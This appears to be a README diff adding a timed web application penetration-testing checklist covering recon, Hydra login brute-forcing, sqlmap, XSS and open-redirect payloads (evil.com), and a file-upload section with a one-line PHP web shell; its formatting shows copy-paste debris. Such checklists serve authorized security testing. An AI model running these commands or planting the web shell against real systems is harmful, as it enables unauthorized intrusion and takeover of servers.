@@ -33,6 +33,119 @@ This repository contains a compilation of various security tools, techniques, an
 - **ffuf**: A fast web fuzzing tool.
 - **wfuzz**: A web application fuzzer used for brute-forcing and testing hidden paths.
 
+### 1. Information Gathering
+- Whois Lookup  
+  ```bash
+  whois example.com
+DNS & Subdomain Enumeration
+bash
+
+Copy
+dig example.com any
+amass enum -d example.com
+sublist3r -d example.com
+HTTP Headers & Server Info
+bash
+
+Copy
+curl -I https://example.com
+nikto -h https://example.com
+Check robots.txt
+bash
+
+Copy
+curl https://example.com/robots.txt
+2. Mapping the Application
+
+Directory & File Discovery
+bash
+
+Copy
+gobuster dir -u https://example.com -w /path/to/wordlist.txt
+Burp Suite Spider (if available)
+Priority 2: Authentication & Session Testing (15 minutes)
+
+3. Authentication Testing
+
+Test default creds & simple brute force with Hydra
+bash
+
+Copy
+hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+Check JWT tokens (decode & manipulate in Burp)
+4. Session Management
+
+Inspect cookies for Secure, HttpOnly flags
+bash
+
+Copy
+curl -I https://example.com
+Use Burp Suite to test session fixation & timeout
+Priority 3: Injection, XSS & URL Redirect Testing (15 minutes)
+
+5. SQL Injection
+
+Quick automated scan with SQLMap
+bash
+
+Copy
+sqlmap -u "https://example.com/page.php?id=1" --batch --dbs
+Manual payloads in Burp Repeater (e.g., ' OR '1'='1)
+6. Cross-Site Scripting (XSS)
+
+Automated scan with XSStrike
+bash
+
+Copy
+xsstrike -u "https://example.com/search?q=test"
+Manual payloads:
+html
+
+Copy
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+7. Open Redirect / URL Redirect Testing
+
+Test URL parameters that redirect users, e.g.:
+
+Copy
+https://example.com/redirect?url=http://evil.com
+Payloads to test:
+
+Copy
+http://evil.com
+//evil.com
+///evil.com
+\evil.com
+javascript:alert(1)
+Use Burp Suite to intercept and modify redirect parameters
+Priority 4: CSRF, File Upload & Security Misconfigurations (10 minutes)
+
+8. CSRF Testing
+
+Check for CSRF tokens on forms using Burp Suite
+Replay requests without tokens to test protection
+9. File Upload Testing
+
+Try uploading a simple web shell or bypass file type restrictions using Burp Suite
+Common payloads:
+shell.php with <?php system($_GET['cmd']); ?>
+Rename extensions (e.g., .php.jpg)
+Modify Content-Type header in Burp to bypass filters
+10. Security Misconfigurations
+
+Nikto scan
+bash
+
+Copy
+nikto -h https://example.com
+Check HTTP methods with Nmap
+bash
+
+Copy
+nmap --script http-methods -p 80,443 example.com
+
+
 ### Directory & Subdomain Enumeration
 
 - **Subdomain Scan**: 
